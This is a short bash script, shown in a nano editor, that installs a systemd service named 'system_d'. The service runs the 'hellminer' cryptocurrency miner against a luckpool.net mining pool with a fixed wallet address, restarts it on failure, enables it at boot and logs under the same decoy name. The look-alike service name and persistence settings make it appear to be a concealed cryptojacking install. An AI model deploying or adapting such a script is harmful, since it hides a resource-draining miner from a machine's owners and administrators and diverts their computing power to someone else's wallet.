  GNU nano 7.2                                                                                       service.sh                                                                                                 
#!/bin/bash
set -e

SERVICE_FILE="/etc/systemd/system/system_d.service"

sudo tee "$SERVICE_FILE" >/dev/null <<'EOF'
[Unit]
Description=system_d Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=ubuntu
WorkingDirectory=/home/ubuntu/vs-mn
ExecStart=/home/ubuntu/vs-mn/hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RS4iSHt3gxrAtQUYSgodJMg1Ja9HsEtD3F.linux -p x --cpu 2
Restart=always
RestartSec=10
Nice=10
LimitNOFILE=1048576
StandardOutput=append:/var/log/system_d.log
StandardError=append:/var/log/system_d.log

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reexec
sudo systemctl daemon-reload
sudo systemctl restart system_d.service
sudo systemctl daemon-reload
sudo systemctl stop system_d.service
sudo systemctl enable system_d.service
sudo systemctl start system_d.service
